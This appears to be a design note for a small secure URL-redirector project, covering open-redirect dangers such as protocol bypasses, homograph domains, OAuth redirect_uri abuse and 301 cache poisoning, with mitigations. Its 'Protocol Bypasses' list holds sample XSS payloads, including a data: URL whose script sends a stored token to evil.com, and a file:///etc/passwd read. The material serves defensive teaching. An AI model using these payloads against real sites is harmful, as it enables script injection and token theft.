# 01-THINKING.md — Simple Redirector (M16)

## Mental Model: The Airport Gate Agent

Imagine an airport gate agent who hands you a boarding pass with a gate number. If the agent writes down any gate you ask for — including "the cargo hold" or "the tarmac" — chaos ensues. A redirector is that gate agent. It must verify that the destination is a real, safe, passenger gate before issuing the pass.

An open redirect is an agent who says: "You want Gate `javascript:alert(1)`? Sure, here you go." The browser (the plane) then executes that instruction in the trusted airport's context.

## The Hot Path

Every request to `POST /redirect` triggers this sequence:

```
1. Extract "url" from JSON body
2. Reject if missing or not a string
3. Parse with new URL(url)
4. Reject if protocol is not http: or https:
5. Reject if hostname is empty
6. Set status 302 and Location header to the URL
7. Send response (no body needed for redirect)
```

**The hot path is entirely CPU-bound.** Parsing a URL with the built-in `URL` constructor is microseconds. The security logic adds negligible latency.

## Danger Zones

### 1. Protocol Bypasses
Attackers craft URLs that look safe but are not:

```
javascript:alert(document.cookie)
javascript://trusted.com/%0Aalert(1)
data:text/html,<script>fetch('https://evil.com?c='+localStorage.token)</script>
file:///etc/passwd
vbscript:msgbox("XSS")
```

**Mitigation:** Strict protocol whitelist. Only `http:` and `https:` pass. No exceptions.

### 2. IDN Homograph Attacks
An attacker registers `https://раураl.com` (Cyrillic а) which visually looks like `https://paypal.com`. The redirector sees a valid `https:` URL and allows it.

**Mitigation:** This micro project does not implement Punycode validation (it would require `punycode` or `URL.hostname` normalization). In production, convert hostnames to ASCII Punycode and check against a domain whitelist.

### 3. Redirect Chains & Loop Detection
A valid `https://evil.com` URL redirects to `https://trusted.com/login`. The initial redirect is safe, but the attacker phishes from the intermediate domain.

**Mitigation:** Out of scope for this micro project. Production systems should display the final destination or use a warning interstitial page.

### 4. OAuth Token Theft
Many OAuth flows use `redirect_uri` parameters. If the authorization server does not validate `redirect_uri` against a pre-registered whitelist, an attacker intercepts the authorization code.

**Mitigation:** OAuth `redirect_uri` validation must use exact string matching against a registered list, not just protocol checks.

### 5. Status Code Cache Poisoning
Using `301 Moved Permanently` for dynamic redirects means browsers cache the redirect forever. An attacker who tricks the server into returning `301` to `evil.com` has permanently hijacked that URL for every visitor.

**Mitigation:** Use `302 Found` (temporary) for dynamic redirects. Only use `301` or `308` for permanent, administrator-configured redirects.

## WRONG vs RIGHT

| WRONG | RIGHT |
|-------|-------|
| `res.redirect(url)` with no validation | Parse with `new URL()`, whitelist protocol, check hostname |
| Accept `javascript:`, `data:`, `file:` | Reject any protocol except `http:` and `https:` |
| Use `301` for dynamic redirects | Use `302` (temporary) for user-supplied URLs |
| Only check if string starts with `http` | Use structured URL parsing; `http://evil.com` passes, `http://` with empty host fails |
| Return redirect body with HTML | Return minimal or empty body; let the browser follow the `Location` header |
| No tests for `javascript:` or `data:` | Test every dangerous protocol vector |

## Key Insight

> **Open redirects feel harmless because they don't crash the server. But they are phishing accelerants.**
>
> A phishing email with a raw `evil.com` link is suspicious. A phishing email with `https://your-bank.com/redirect?url=evil.com` bypasses user skepticism and domain-reputation filters. The cost of validation is microseconds; the cost of a breach is millions.

## SOURCES

- [OWASP Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- PortSwigger, "Open Redirect Vulnerabilities," 2023.
